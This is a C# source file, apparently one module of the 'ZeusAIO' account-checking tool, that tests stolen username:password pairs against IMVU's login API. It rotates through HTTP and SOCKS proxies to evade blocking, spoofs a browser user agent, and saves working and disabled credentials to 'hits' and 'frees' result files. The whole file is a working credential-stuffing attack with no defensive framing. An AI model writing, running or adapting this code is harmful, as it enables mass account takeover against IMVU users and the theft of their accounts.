using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Imvu
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = false;
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
                        httpRequest.AddHeader("Origin", "https://secure.imvu.com");
                        string post = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"gdpr_cookie_acceptance\":false}";
                        string text2 = httpRequest.Post("https://api.imvu.com/login", post, "application/json;charset=UTF-8").ToString();
                        bool flag7 = text2.Contains("\"status\":\"success\"");

                        if (flag7)
                        {
                            ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - IMVU] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Imvu_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                        else if (text2.Contains("This account is disabled"))
                        {
                                ZeusAIO.mainmenu.frees++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[FREE - IMVU] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Imvu_frees", s[0] + ":" + s[1]);
                                return false;
                            }
                        else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                    }
                    break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }

    }
}
